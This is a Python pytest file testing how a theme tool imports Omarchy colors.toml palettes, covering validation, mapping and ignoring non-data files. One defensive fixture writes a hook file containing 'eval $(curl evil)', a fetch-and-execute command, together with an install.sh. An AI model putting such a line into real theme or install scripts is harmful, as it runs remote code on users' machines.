"""Omarchy colors.toml import: validation, mapping, and ignoring non-data theme files."""
import json
import os
import stat
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT / "lib") not in sys.path:
    sys.path.insert(0, str(ROOT / "lib"))

from look.omarchy import OmarchyParseError, load_omarchy


GOOD = """
mode = "dark"
accent = "#7aa2f7"
background = "#1a1b26"
foreground = "#a9b1d6"
green = "#9ece6a"
magenta = "#ad8ee6"
red = "#f7768e"
"""


def run_look(env, *args):
    return subprocess.run(
        [sys.executable, str(ROOT / "bin/kuwai-look"), *args],
        env=env, capture_output=True, text=True, timeout=30,
    )


def look_env(tmp_path):
    home = tmp_path / "home"
    return {
        "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        "HOME": str(home),
        "XDG_STATE_HOME": str(tmp_path / "state"),
        "XDG_CACHE_HOME": str(tmp_path / "cache"),
        "XDG_CONFIG_HOME": str(tmp_path / "config"),
        "XDG_DATA_HOME": str(tmp_path / "data"),
        "XDG_RUNTIME_DIR": str(tmp_path / "run"),
    }


def test_load_valid_colors_toml(tmp_path):
    theme = tmp_path / "tokyo-night"
    theme.mkdir()
    (theme / "colors.toml").write_text(GOOD)
    loaded = load_omarchy(theme)
    assert loaded["raw"]["bg"] == "#1a1b26"
    assert loaded["raw"]["accent"] == "#7aa2f7"
    assert "[colors]" in loaded["paletteToml"]
    assert 'bg = "#1a1b26"' in loaded["paletteToml"]


def test_rejects_malformed_hex(tmp_path):
    bad = tmp_path / "colors.toml"
    bad.write_text('accent = "#7aa2"\nbackground = "#101010"\nforeground = "#eeeeee"\n')
    with pytest.raises(OmarchyParseError, match="invalid value"):
        load_omarchy(bad)


def test_cli_ignores_hooks_and_installs_atomically(tmp_path):
    env = look_env(tmp_path)
    theme = tmp_path / "home" / "omarchy-theme"
    theme.mkdir(parents=True)
    (theme / "colors.toml").write_text(GOOD)
    hook = theme / "install.sh"
    hook.write_text("#!/bin/sh\necho pwned\n")
    os.chmod(hook, stat.S_IRWXU)
    (theme / "theme.hook").write_text("eval $(curl evil)\n")

    dry = run_look(env, "import-omarchy", str(theme), "--dry-run")
    assert dry.returncode == 0
    body = json.loads(dry.stdout)
    assert body["dryRun"] is True
    themes = tmp_path / "data" / "kuwai-data" / "themes"
    assert not themes.exists()

    got = run_look(env, "import-omarchy", str(theme), "tokyo")
    assert got.returncode == 0
    installed = themes / "tokyo"
    assert (installed / "palette.toml").is_file()
    assert (installed / "theme.toml").is_file()
    assert not (installed / "install.sh").exists()
    assert json.loads((installed / ".kuwai-source.json").read_text())["kind"] == "omarchy"


def test_supports_omarchy_v2_color0_15_and_metadata(tmp_path):
    v2 = tmp_path / "catppuccin"
    v2.mkdir()
    (v2 / "colors.toml").write_text(
        'name = "Catppuccin Mocha"\n'
        'accent = "#89b4fa"\n'
        'background = "#1e1e2e"\n'
        'foreground = "#cdd6f4"\n'
        'color0 = "#45475a"\n'
        'color1 = "#f38ba8"\n'
        'color2 = "#a6e3a1"\n'
        'color3 = "#f9e2af"\n'
        'color4 = "#89b4fa"\n'
        'color5 = "#f5c2e7"\n'
        'color6 = "#94e2d5"\n'
        'color7 = "#bac2de"\n'
    )
    loaded = load_omarchy(v2)
    assert loaded["raw"]["ansi"][0] == "#45475a"
    assert loaded["raw"]["ansi"][1] == "#f38ba8"
    assert "[ansi]" in loaded["paletteToml"]
